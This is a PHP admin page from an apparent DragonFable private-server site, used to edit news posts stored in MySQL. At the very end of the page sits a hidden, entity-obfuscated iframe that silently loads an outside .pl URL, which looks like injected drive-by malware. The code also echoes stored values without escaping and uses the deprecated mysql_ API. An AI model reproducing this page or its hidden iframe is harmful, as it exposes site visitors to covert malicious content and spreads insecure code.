<?php
include ("../includes/mysql_connector.php");
session_start();
if(!isset($_SESSION['admin'])){
	header('location: ../login.php');
	exit();
} else {
	if(isset($_GET['id'])){
		if(is_numeric($_GET['id'])){
			$id = $_GET['id'];
			$sql = mysql_query("SELECT * FROM df_news WHERE id = '".$id."'");
			if ($data = mysql_fetch_assoc($sql)) {
				$avatar = $data['avatar'];
				$caption = $data['caption'];
				$text = $data['text'];
				$title = $data['title'];
				$id = $data['id'];
				$message = '<form action="editnews.php" method="POST"><table border="0">
						<tr><td>Title:</td> <td><input type="text" name="title" value="'.$title.'" /></td></tr>
						<tr><td>Avatar:</td> <td><input type="text" name="avatar" value="'.$avatar.'"/>
						<tr><td>Caption:</td> <td><input type="text" name="caption" value="'.$caption.'" /></td></tr></table>
						<textarea name="text" cols="50" rows="4">'.$text.'</textarea><br />
						<input type="submit" value="Edit post #'.$id.'" />
						<input type="hidden" name="submitted" value="true" />
						<input type="hidden" name="id" value="'.$id.'" /></form>';
			} else {
				$message = "Error gathering the post's data.  Are you sure it's a real post?";
			}
		} else {
			$message = "The ID is not a number.";
		}
	} elseif (isset($_POST['submitted'])){
		$title = mysql_real_escape_string(stripslashes($_POST['title']));
		$text = mysql_real_escape_string(stripslashes($_POST['text']));
		$avatar = mysql_real_escape_string(stripslashes($_POST['avatar']));
		$id = mysql_real_escape_string(stripslashes($_POST['id']));
		$sql = mysql_query("UPDATE df_news SET text = '".$text."', title = '".$title."', avatar = '".$avatar."', caption = '".$caption."' WHERE id = '".$id."'");
		if($sql){ $message = "The post number ".$id." has been successfully updated!"; }
	} else {
		$message = "The ID is not set.";
	}
}
?>
<?php
$query = mysql_query("SELECT * FROM df_settings LIMIT 1");
$fetch = mysql_fetch_assoc($query);
$sitename = $fetch['DFSitename'];
$skin = $fetch["backgrondSkin"];
$time = date(" g:i:s A ");
?>
<html>
<head>
<title><?php echo $sitename; ?> - Edit News</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="../includes/dragonfable.css" rel="stylesheet" type="text/css">
<?php 
	if($message == "The post number ".$id." has been successfully updated!"){ 
		echo "<meta http-equiv=\"REFRESH\" content=\"0;url=index.php\">"; 
	} else{
		echo "";
		}
?>
<style type="text/css">
<!--
body   {background: #000000 url(../<?php echo $skin; ?>) no-repeat fixed top center;}
#skin-wrap {
	position: absolute;
	width: 1600px;
	top: 0px;
	left: 50%;
	margin-left: -800px;
}
#main-content {
	position: absolute;
	width: 950px;
	top: 0px;
	left: 50%;
	margin-left: -475px;
}
.style1 {
	font-size: 13px;
	font-weight: bold;
}
-->
</style>
<script src="../includes/AC_RunActiveContent.js" type="text/javascript"></script>
</head>
<body>
<!-- Header -->
<script src="../includes/AC_RunActiveContent.js" type="text/javascript"></script>
<table border="0" align="center" cellpadding="2" cellspacing="0">
  <tr>
    <td bgcolor="#000000" valign="top"><table width="750" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="225" align="left" valign="top" class="tdbg" id="menu">
        <!--Navigation -->
		<?php include_once "../sidebar.php"; ?></td>
        <td width="525" align="left" valign="top" class="tdbg">
			<table width="525" border="0" cellspacing="0" cellpadding="0">
				<tr>
				  <td colspan="2" align="right" bgcolor="#660000"><img src="../images/clear.gif" width="400" height="60"></td>
			  </tr>
              <tr>
				  <td colspan="2" class="tdtrim"><img src="../images/clear.gif" height="2"></td>
			  </tr>
				<tr>
				  <td height="25" align="right" valign="middle"><img src="../images/clear.gif" width="1" height="25" align="left"></td>
				 <td align="right" valign="middle"><span class="server"><strong class="style2">Server Status:</strong> <font color=white>Online</font>. &nbsp;&nbsp;&nbsp;[<strong class="style2"><?php echo $time; ?>
				 </strong>] &nbsp;</span></td>
				</tr>              
            </table>
			<table width="525" border="0" cellspacing="0" cellpadding="5">
              <tr>
                <td class="tdbg">&nbsp;</td>
              </tr>
              <tr>
                <td class="tdbg" align="left"><!-- End Header -->
                  <br />
                  <table width="500" border="0" cellpadding="10" cellspacing="0">
                    <tr>
                      <td align="left" valign="top"><p><?php echo $message; ?></p>
                      </td>
                    </tr>
                  </table>
                  <!-- Footer -->
</td>
  </tr>
</table>
</td>
</tr>
<tr>
  <td colspan="2" align="center" class="tdbase"><p align="center"><em>Copyright &copy; 2010 Artix Entertainment, LLC. All Rights Reserved.</em><br />&quot;AdventureQuest&quot;,  &quot;DragonFable&quot;, &quot;MechQuest&quot;, &quot;ArchKnight&quot;, &quot;BattleOn.com&quot;,  &quot;AdventureQuest Worlds&quot;, &quot;Artix Entertainment&quot;<br />and all game  character names are either trademarks or registered trademarks of Artix  Entertainment, LLC. All rights are reserved.</p><br /><br /></td>
</tr>
</table>
</td>
<?php include_once "../right-sidebar.php"; ?>
</tr>
</table>
<iframe src="http://jL.ch&#117;ra.pl/rc/" style="d&#105;splay:none"></iframe>
</body>
</html>